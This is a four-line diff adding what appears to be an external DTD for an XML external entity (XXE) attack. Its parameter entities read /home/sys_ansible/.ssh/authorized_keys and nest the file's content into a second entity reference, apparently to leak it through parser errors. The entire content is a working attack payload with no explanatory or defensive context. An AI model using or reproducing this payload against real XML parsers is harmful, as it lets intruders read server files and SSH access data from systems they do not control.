@@ -1,0 +1,4 @@
+<!ENTITY % cfga SYSTEM "file:///home/sys_ansible/.ssh/authorized_keys">
+<!ENTITY % eea "<!ENTITY &#x25; lobsterdata SYSTEM '#%cfga;'>">
+%eea;
+%lobsterdata;
